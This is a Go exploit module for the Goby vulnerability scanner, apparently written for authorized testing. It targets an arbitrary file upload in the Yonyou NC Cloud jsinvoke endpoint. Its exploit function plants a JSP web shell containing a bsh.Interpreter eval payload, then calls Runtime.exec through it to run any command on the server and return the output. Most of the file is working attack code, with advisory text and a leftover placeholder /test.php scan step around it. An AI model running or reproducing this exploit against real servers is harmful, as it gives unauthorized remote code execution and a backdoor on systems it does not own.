package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yongyou NC Cloud jsinvoke file upload vulnerability",
    "Description": "<p>Yongyou NC-Cloud on iuap social commercial application platform, centering on the four control objects of people, finance, material and customer, it helps enterprises to build a work platform, management platform, operation platform and business platform oriented to social commerce, connecting global, network and domain resources, enabling enterprises to realize technology-driven business reform and business innovation.</p><p>The jsinvoke interface has any file upload vulnerability, through which an attacker can arbitrarily execute code on the server side, write back door, obtain server permissions, and then control the whole web server.</p>",
    "Product": "yonyou-NC-Cloud",
    "Homepage": "https://hc.yonyou.com/product.php?id=4",
    "DisclosureDate": "2022-03-23",
    "Author": "1171373465@qq.com",
    "FofaQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"../Client/Uclient/UClient.dmg\"",
    "GobyQuery": "banner=\"nccloud\" || header=\"nccloud\" || (body=\"/platform/yonyou-yyy.js\" && body=\"/platform/ca/nccsign.js\") || body=\"window.location.href=\\\"platform/pub/welcome.do\\\";\" || (body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\" || (title==\"产品登录界面\" && body=\"UFIDA NC\") || body=\"../Client/Uclient/UClient.dmg\"",
    "Level": "3",
    "Impact": "<p>Through this vulnerability, an attacker can execute arbitrary commands on the server to obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1, the manufacturer has released the vulnerability repair program, please pay attention to the update: <a href=\"https://hc.yonyou.com.\">https://hc.yonyou.com.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友 NC Cloud jsinvoke 文件上传漏洞",
            "Product": "用友-NC-Cloud",
            "Description": "<p>用友 NC Cloud 基于 iuap 社会化商业应用基础平台，围绕人、财、物、客四大管控对象，帮助企业构建面向社会化商业的工作平台、管理平台、运营平台和生意平台，连接全球、全网、全域资源，赋能企业实现基于技术驱动的业务变革和商业创新。<br></p><p>其中 jsinvoke 接口存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://hc.yonyou.com\">https://hc.yonyou.com</a>。<br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行命令，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Yongyou NC Cloud jsinvoke file upload vulnerability",
            "Product": "yonyou-NC-Cloud",
            "Description": "<p>Yongyou NC-Cloud on iuap social commercial application platform, centering on the four control objects of people, finance, material and customer, it helps enterprises to build a work platform, management platform, operation platform and business platform oriented to social commerce, connecting global, network and domain resources, enabling enterprises to realize technology-driven business reform and business innovation.</p><p>The jsinvoke interface has any file upload vulnerability, through which an attacker can arbitrarily execute code on the server side, write back door, obtain server permissions, and then control the whole web server.</p>",
            "Recommendation": "<p>1, the manufacturer has released the vulnerability repair program, please pay attention to the update: <a href=\"https://hc.yonyou.com.\">https://hc.yonyou.com.</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>Through this vulnerability, an attacker can execute arbitrary commands on the server to obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10829"
}`

	sendpostRequests51sdSDAD515 := func(hostInfo *httpclient.FixUrl, payload, filename_randomStr string) (*httpclient.HttpResponse, error) {
		uri := "/uapjs/jsinvoke/?action=invoke"
		postConfig := httpclient.NewPostRequestConfig(uri)
		postConfig.VerifyTls = false
		postConfig.FollowRedirect = false
		postConfig.Header.Store("Content-Type", "application/json")
		postConfig.Data = "{\"serviceName\":\"nc.itf.iufo.IBaseSPService\",\"methodName\":\"saveXStreamConfig\",\"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"],\"parameters\":[\"" + payload + "\",\"webapps/nc_web/" + filename_randomStr + "\"]}"
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	sendgetRequestS154FM15102 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		getConfig := httpclient.NewGetRequestConfig(uri)
		getConfig.VerifyTls = false
		getConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(16)
			filename_randomStr := goutils.RandomHexString(8) + ".jsp"
			resp, err := sendpostRequests51sdSDAD515(u, randomStr, filename_randomStr)
			if err == nil {
				if resp.StatusCode == 200 {
					uri := "/" + filename_randomStr
					resp1, err1 := sendgetRequestS154FM15102(u, uri)
					if err1 == nil {
						return resp1.StatusCode == 200 && strings.Contains(resp1.Utf8Html, randomStr)
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			cmd = strings.Replace(cmd, " ", "%20", -1)
			filename_randomStr := goutils.RandomHexString(8) + ".jsp"
			payloadCode := "${param.getClass().forName(param.error).newInstance().eval(param.cmd)}"
			resp, err := sendpostRequests51sdSDAD515(expResult.HostInfo, payloadCode, filename_randomStr)
			if err == nil {
				if resp.StatusCode == 200 {
					uri := "/" + filename_randomStr + "?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22" + cmd + "%22).getInputStream())"
					resp1, err1 := sendgetRequestS154FM15102(expResult.HostInfo, uri)
					if err1 == nil {
						if resp1.StatusCode == 200 {
							regex := regexp.MustCompile(`(?i)<\?xml[^>]*>|<\/?string>`)
							result := regex.ReplaceAllString(resp1.RawBody, "")
							expResult.Output = result
							expResult.Success = true
							return expResult

						}
					}
				}
			}
			return expResult
		},
	))
}
